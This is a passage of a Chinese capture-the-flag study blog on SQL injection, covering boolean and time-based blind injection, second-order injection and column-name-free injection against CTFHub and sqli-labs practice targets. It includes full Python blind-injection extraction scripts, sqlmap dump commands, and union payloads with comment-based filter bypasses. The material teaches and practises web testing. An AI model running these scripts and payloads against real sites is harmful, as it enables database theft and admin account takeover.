<h3 id="sqlmap解法-2"><a href="#sqlmap解法-2" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><ul>
<li>解法和<code>整数型注入</code>相同。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-5d7e63900aa73836.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694940318_6506bc9ec18a01fe8bd3e.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>回显只有<code>True</code>和<code>False</code>的情况。<a class="link"   href="https://blog.csdn.net/Xxy605/article/details/109750292" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="手动解法-3"><a href="#手动解法-3" class="headerlink" title="手动解法"></a>手动解法</h3><ol>
<li>可以编写脚本，逐字节爆破。</li>
</ol>
<ul>
<li>输入<code>1 and 1=1</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941068_6506bf8ce8344cd7b2a76.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and1=2</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941405_6506c0dd359632ea635fa.jpeg"
                      alt="图片.png"
                ></li>
<li>输入<code>1 and (substr((select flag from flag),1,1)=&#39;c&#39;)</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941363_6506c0b35f287f501d352.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<ol start="2">
<li>脚本</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入库</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#设定环境URL，由于每次开启环境得到的URL都不同，需要修改！</span><br><span class="line">url = &#x27;http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/&#x27;</span><br><span class="line">#作为盲注成功的标记，成功页面会显示query_success</span><br><span class="line">success_mark = &quot;query_success&quot;</span><br><span class="line">#把字母表转化成ascii码的列表，方便便利，需要时再把ascii码通过chr(int)转化成字母</span><br><span class="line">ascii_range = range(ord(&#x27;a&#x27;),1+ord(&#x27;z&#x27;))</span><br><span class="line">#flag的字符范围列表，包括花括号、a-z，数字0-9</span><br><span class="line">str_range = [123,125] + list(ascii_range) + list(range(48,58))</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名长度</span><br><span class="line">def getLengthofDatabase():</span><br><span class="line">	#初始化库名长度为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环库名长度</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and length(database())=&#123;&#125;&quot;.format(i)</span><br><span class="line">        #GET请求</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        #如果返回的页面有query_success，即盲猜成功即跳出无限循环</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终库名长度</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，库名长度+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取数据库名</span><br><span class="line">def getDatabase(length_of_database):</span><br><span class="line">	#定义存储库名的变量</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    #库名有多长就循环多少次</span><br><span class="line">    for i in range(length_of_database):</span><br><span class="line">    	#切片，对每一个字符位遍历字母表</span><br><span class="line">    	#i+1是库名的第i+1个字符下标，j是字符取值a-z</span><br><span class="line">        for j in ascii_range:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i+1,chr(j))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到库名变量里</span><br><span class="line">                name += chr(j)</span><br><span class="line">                #当前下标字符匹配成功，退出遍历，对下一个下标进行遍历字母表</span><br><span class="line">                break</span><br><span class="line">    #返回最终的库名</span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库的表数量</span><br><span class="line">def getCountofTables(database):</span><br><span class="line">	#初始化表数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(database,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终表数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，表数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名长度</span><br><span class="line">def getLengthListofTables(database,count_of_tables):</span><br><span class="line">	#定义存储表名长度的列表</span><br><span class="line">	#使用列表是考虑表数量不为1，多张表的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少张表就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#j从1开始，无限循环表名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">        	#i+1是第i+1张表</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到表名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，表名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的表名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库所有表的表名</span><br><span class="line">def getTables(database,count_of_tables,length_list):</span><br><span class="line">    #定义存储表名的列表</span><br><span class="line">    tables=[]</span><br><span class="line">    #表数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_tables):</span><br><span class="line">    	#定义存储表名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #表名有多长就循环多少次</span><br><span class="line">        #表长度和表序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">        	#k是字符取值a-z</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select table_name from information_schema.tables where table_schema=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到表名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加表名到表名列表里</span><br><span class="line">        tables.append(name)</span><br><span class="line">    #返回最终的表名列表</span><br><span class="line">    return tables</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定表的列数量</span><br><span class="line">def getCountofColumns(table):</span><br><span class="line">	#初始化列数量为1</span><br><span class="line">    i = 1</span><br><span class="line">    #i从1开始，无限循环</span><br><span class="line">    while True:</span><br><span class="line">        new_url = url + &quot;?id=1 and (select count(*) from information_schema.columns where table_name=&#x27;&#123;&#125;&#x27;)=&#123;&#125;&quot;.format(table,i)</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">        if success_mark in r.text:</span><br><span class="line">        	#返回最终列数量</span><br><span class="line">            return i</span><br><span class="line">        #如果没有匹配成功，列数量+1接着循环</span><br><span class="line">        i = i + 1</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列的列名长度</span><br><span class="line">def getLengthListofColumns(database,table,count_of_column):</span><br><span class="line">	#定义存储列名长度的变量</span><br><span class="line">	#使用列表是考虑列数量不为1，多个列的情况</span><br><span class="line">    length_list=[]</span><br><span class="line">    #有多少列就循环多少次</span><br><span class="line">    for i in range(count_of_column):</span><br><span class="line">        #j从1开始，无限循环列名长度</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">            new_url = url + &quot;?id=1 and length((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1))=&#123;&#125;&quot;.format(database,table,i,j)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#匹配到就加到列名长度的列表</span><br><span class="line">                length_list.append(j)</span><br><span class="line">                break</span><br><span class="line">            #如果没有匹配成功，列名长度+1接着循环</span><br><span class="line">            j = j + 1</span><br><span class="line">    #返回最终的列名长度的列表</span><br><span class="line">    return length_list</span><br><span class="line"></span><br><span class="line">#自定义函数获取指定库指定表的所有列名</span><br><span class="line">def getColumns(database,table,count_of_columns,length_list):</span><br><span class="line">	#定义存储列名的列表</span><br><span class="line">    columns = []</span><br><span class="line">    #列数量有多少就循环多少次</span><br><span class="line">    for i in range(count_of_columns):</span><br><span class="line">        #定义存储列名的变量</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        #列名有多长就循环多少次</span><br><span class="line">        #列长度和列序号（i）一一对应</span><br><span class="line">        for j in range(length_list[i]):</span><br><span class="line">            for k in ascii_range:</span><br><span class="line">                new_url = url + &quot;?id=1 and substr((select column_name from information_schema.columns where table_schema=&#x27;&#123;&#125;&#x27; and table_name=&#x27;&#123;&#125;&#x27; limit &#123;&#125;,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(database,table,i,j+1,chr(k))</span><br><span class="line">                r = requests.get(new_url)</span><br><span class="line">                if success_mark in r.text:</span><br><span class="line">                	#匹配到就加到列名变量里</span><br><span class="line">                    name = name + chr(k)</span><br><span class="line">                    break</span><br><span class="line">        #添加列名到列名列表里</span><br><span class="line">        columns.append(name)</span><br><span class="line">    #返回最终的列名列表</span><br><span class="line">    return columns</span><br><span class="line"></span><br><span class="line">#对指定库指定表指定列爆数据（flag）</span><br><span class="line">def getData(database,table,column,str_list):</span><br><span class="line">	#初始化flag长度为1</span><br><span class="line">    j = 1</span><br><span class="line">    #j从1开始，无限循环flag长度</span><br><span class="line">    while True:</span><br><span class="line">    	#flag中每一个字符的所有可能取值</span><br><span class="line">        for i in str_list:</span><br><span class="line">            new_url = url + &quot;?id=1 and substr((select &#123;&#125; from &#123;&#125;.&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(column,database,table,j,chr(i))</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            #如果返回的页面有query_success，即盲猜成功，跳过余下的for循环</span><br><span class="line">            if success_mark in r.text:</span><br><span class="line">            	#显示flag</span><br><span class="line">                print(chr(i),end=&quot;&quot;)</span><br><span class="line">                #flag的终止条件，即flag的尾端右花括号</span><br><span class="line">                if chr(i) == &quot;&#125;&quot;:</span><br><span class="line">                    print()</span><br><span class="line">                    return 1</span><br><span class="line">                break</span><br><span class="line">        #如果没有匹配成功，flag长度+1接着循环</span><br><span class="line">        j = j + 1</span><br><span class="line"></span><br><span class="line">#--主函数--</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">	#爆flag的操作</span><br><span class="line">	#还有仿sqlmap的UI美化</span><br><span class="line">    print(&quot;Judging the number of tables in the database...&quot;)</span><br><span class="line">    database = getDatabase(getLengthofDatabase())</span><br><span class="line">    count_of_tables = getCountofTables(database)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in this database&quot;.format(count_of_tables))</span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the table name...&quot;)</span><br><span class="line">    length_list_of_tables = getLengthListofTables(database,count_of_tables)</span><br><span class="line">    tables = getTables(database,count_of_tables,length_list_of_tables)</span><br><span class="line">    for i in tables:</span><br><span class="line">        print(&quot;[+]&#123;&#125;&quot;.format(i))</span><br><span class="line">    print(&quot;The table names in this database are : &#123;&#125;&quot;.format(tables))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的表</span><br><span class="line">    i = input(&quot;Select the table name:&quot;)</span><br><span class="line"></span><br><span class="line">    if i not in tables:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the column names in the &#123;&#125; table......&quot;.format(i))</span><br><span class="line">    count_of_columns = getCountofColumns(i)</span><br><span class="line">    print(&quot;[+]There are &#123;&#125; tables in the &#123;&#125; table&quot;.format(count_of_columns,i))</span><br><span class="line">    length_list_of_columns = getLengthListofColumns(database,i,count_of_columns)</span><br><span class="line">    columns = getColumns(database,i,count_of_columns,length_list_of_columns)</span><br><span class="line">    print(&quot;[+]The column(s) name in &#123;&#125; table is:&#123;&#125;&quot;.format(i,columns))</span><br><span class="line"></span><br><span class="line">	#选择所要查询的列</span><br><span class="line">    j = input(&quot;Select the column name:&quot;)</span><br><span class="line"></span><br><span class="line">    if j not in columns:</span><br><span class="line">        print(&quot;Error!&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print()</span><br><span class="line">    print(&quot;Getting the flag......&quot;)</span><br><span class="line">    print(&quot;[+]The flag is &quot;,end=&quot;&quot;)</span><br><span class="line">    getData(database,i,j,str_range)</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694941947_6506c2fb60cad0ca1b84a.jpeg"
                      alt="图片.png"
                ></p>
<h3 id="sqlmap解法-3"><a href="#sqlmap解法-3" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-65d736fce6a4670d.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>没有回显结果，无法通过回显判断 SQL 语句是否执行成功。通常采用<code>if((bool),sleep(3),0)</code>语句，通过页面响应时间判断是否存在时间盲注。<a class="link"   href="https://blog.csdn.net/weixin_45254208/article/details/107578439" >思路解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<h3 id="手动解法-4"><a href="#手动解法-4" class="headerlink" title="手动解法"></a>手动解法</h3><ul>
<li>输入<code>1 and if(length(database())=4,sleep(3),0)</code>。页面 sleep(3) 秒左右，然后响应。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694943271_6506c827937d659d67625.jpeg"
                      alt="图片.png"
                ></li>
<li>脚本</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">session=requests.session()</span><br><span class="line">url = &quot;http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=&quot;</span><br><span class="line">name = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for k in range(1,10):</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		print(i)</span><br><span class="line">		for j in range(31,128):</span><br><span class="line">			j = (128+31) -j</span><br><span class="line">			str_ascii=chr(j)</span><br><span class="line">			#数据库名</span><br><span class="line">			payolad = &quot;if(substr(database(),%s,1) = &#x27;%s&#x27;,sleep(1),1)&quot;%(str(i),str(str_ascii))</span><br><span class="line">			#表名</span><br><span class="line">			#payolad = &quot;if(substr((select table_name from information_schema.tables where table_schema=&#x27;sqli&#x27; limit %d,1),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(k,i,str(str_ascii))</span><br><span class="line">			#字段名</span><br><span class="line">			#payolad = &quot;if(substr((select column_name from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=&#x27;sqli&#x27;),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str(str_ascii))</span><br><span class="line">			start_time=time.time()</span><br><span class="line">			str_get = session.get(url=url + payolad)</span><br><span class="line">			end_time = time.time()</span><br><span class="line">			t = end_time - start_time</span><br><span class="line">			if t &gt; 1:</span><br><span class="line">				if str_ascii == &quot;+&quot;:</span><br><span class="line">					sys.exit()</span><br><span class="line">				else:</span><br><span class="line">					name+=str_ascii</span><br><span class="line">					break</span><br><span class="line">		print(name)</span><br><span class="line"></span><br><span class="line">#查询字段内容</span><br><span class="line">for i in range(1,50):</span><br><span class="line">	print(i)</span><br><span class="line">	for j in range(31,128):</span><br><span class="line">		j = (128+31) -j</span><br><span class="line">		str_ascii=chr(j)</span><br><span class="line">		payolad = &quot;if(substr((select flag from sqli.flag),%d,1) = &#x27;%s&#x27;,sleep(1),1)&quot; %(i,str_ascii)</span><br><span class="line">		start_time = time.time()</span><br><span class="line">		str_get = session.get(url=url + payolad)</span><br><span class="line">		end_time = time.time()</span><br><span class="line">		t = end_time - start_time</span><br><span class="line">		if t &gt; 1:</span><br><span class="line">			if str_ascii == &quot;+&quot;:</span><br><span class="line">				sys.exit()</span><br><span class="line">			else:</span><br><span class="line">				name += str_ascii</span><br><span class="line">				break</span><br><span class="line">	print(name)</span><br></pre></td></tr></table></figure></div>

<h3 id="sqlmap解法-4"><a href="#sqlmap解法-4" class="headerlink" title="sqlmap解法"></a>sqlmap解法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -level=5 risk=3</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 --current-db</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables</span><br><span class="line">sqlmap -u http://challenge-eadc616ac9ba5e71.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --dump</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694944289_6506cc2183450b2d166e8.jpeg"
                      alt="图片.png"
                ></p>
<h1 id="sql注入进阶"><a href="#sql注入进阶" class="headerlink" title="sql注入进阶"></a>sql注入进阶</h1><ul>
<li><strong>参考书籍《CTF实战：技术、解题与进阶》</strong></li>
</ul>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><ul>
<li>原理：二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入，二次注入是输入数据经处理后存储，取出后，再次进入到 SQL 查询，以绕过开发人员设置的一些检查。</li>
</ul>
<ol>
<li>第一步，插入恶意数据。Web程序对插入的数据进行转义和过滤，写入数据库时又将其还原。</li>
<li>第二步，引用恶意数据。Web程序将数据从数据库中取出并调用时，恶意 SQL 语句被带入原始语句中，造成 SQL 二次注入。</li>
</ol>
<ul>
<li>例题：sqli-labs-24。<br>登陆界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949921_6506e2212317dbf6d9192.jpeg"
                      alt="图片.png"
                ><br>登陆代码：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">//转义</span><br><span class="line">function sqllogin($con1)&#123;</span><br><span class="line"></span><br><span class="line">   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">   $password = mysqli_real_escape_string($con1, $_POST[&quot;login_password&quot;]);</span><br><span class="line">   $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">   $res = mysqli_query($con1, $sql) or die(&#x27;You tried to be real smart, Try harder!!!! :( &#x27;);</span><br><span class="line">   $row = mysqli_fetch_row($res);</span><br><span class="line">	 //print_r($row) ;</span><br><span class="line">   if ($row[1]) &#123;</span><br><span class="line">	    return $row[1];</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">	    return 0;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注册界面：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694949969_6506e25189686b0a33b02.jpeg"
                      alt="图片.png"
                ><br>注册代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	# Validating the user input........</span><br><span class="line"></span><br><span class="line">	//$username=  $_POST[&#x27;username&#x27;] ;</span><br><span class="line">	$username=  mysqli_real_escape_string($con1, $_POST[&#x27;username&#x27;]) ;</span><br><span class="line">	$pass= mysqli_real_escape_string($con1, $_POST[&#x27;password&#x27;]);</span><br><span class="line">	$re_pass= mysqli_real_escape_string($con1, $_POST[&#x27;re_password&#x27;]);</span><br><span class="line"></span><br><span class="line">	echo &quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;</span><br><span class="line">	$sql = &quot;select count(*) from users where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">	$res = mysqli_query($con1, $sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);</span><br><span class="line">	$row = mysqli_fetch_row($res);</span><br><span class="line"></span><br><span class="line">	//print_r($row);</span><br><span class="line">	if (!$row[0]==0) </span><br><span class="line">	&#123;</span><br><span class="line">		?&gt;</span><br><span class="line">		&lt;script&gt;alert(&quot;The username Already exists, Please choose a different username &quot;)&lt;/script&gt;;</span><br><span class="line">		&lt;?php</span><br><span class="line">		header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	else </span><br><span class="line">	&#123;</span><br><span class="line">		if ($pass==$re_pass)</span><br><span class="line">		&#123;</span><br><span class="line">			# Building up the query........</span><br><span class="line"></span><br><span class="line">			$sql = &quot;insert into users (username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;</span><br><span class="line">			mysqli_query($con1, $sql) or die(&#x27;Error Creating your user account,  : &#x27;.mysqli_error($con1));</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;   				</span><br><span class="line">			//echo &quot;&lt;h1&gt;User Created Successfully&lt;/h1&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;&quot;;					</span><br><span class="line">			echo &quot;&lt;/br&gt;Redirecting you to login page in 5 sec................&quot;;</span><br><span class="line">			echo &quot;&lt;font size=&#x27;2&#x27;&gt;&quot;;</span><br><span class="line">			echo &quot;&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;&quot;;</span><br><span class="line">			header(&#x27;refresh:5, url=index.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			?&gt;</span><br><span class="line">			&lt;script&gt;alert(&#x27;Please make sure that password field and retype password match correctly&#x27;)&lt;/script&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">			header(&#x27;refresh:1, url=new_user.php&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>利用流程：</p>
<ol>
<li>利用注册，将<code>admin&#39;#</code>插入数据库。</li>
<li>以<code>admin&#39;#</code>登录，执行<code>sql = &quot;SELECT * FROM users WHERE username=&#39;admin &#39;#&#39; and password=&#39;$password&#39;&quot;;</code>并可修改<code>admin</code>密码。</li>
</ol>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1694950421_6506e415ac6b7d4482328.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="无名列注入"><a href="#无名列注入" class="headerlink" title="无名列注入"></a>无名列注入</h2><ul>
<li>无名列注入就是在不知道列名的情况下进行 sql 注入。通常我们用于获取所有库的库名，表名，列名的 infomation_scema 库经常被 WAF 过滤。无名列注入适用于已经获取数据表但无法查询列的情况。</li>
<li>原理：类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。<br>正常查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194369_650a9d01e1b1809cd83e1.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194467_650a9d636c71cc4a210d1.jpeg"
                      alt="图片.png"
                ><br>union 查询<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194533_650a9da57fb6fe93ed0be.jpeg"
                      alt="图片.png"
                ><br>利用数字<strong>3</strong>代替未知列名需要加上反引号`3`。后面的<strong>a</strong>表示上图中表的别名。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194729_650a9e695aa1c4a0aa786.jpeg"
                      alt="图片.png"
                ><br>若反引号被过滤掉，可用别名代替。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695194788_650a9ea40e73244560dcc.jpeg"
                      alt="图片.png"
                ></li>
</ul>
<p>BUU例题：[SWPU2019]Web1<br>注册后经测试，过滤了<code>or</code>,<code>#</code>,<code>--``+</code>和。<br>爆破库名：<br><code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195496_650aa168b53c1e2368e8a.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195565_650aa1ad8375a774ee6b2.jpeg"
                      alt="图片.png"
                ><br>爆破表名：<br><code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195692_650aa22c6adc022c33f16.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195703_650aa2372de91d8573484.jpeg"
                      alt="图片.png"
                ><br>无名列注入：<br><code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195756_650aa26c9b351d824deca.jpeg"
                      alt="图片.png"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
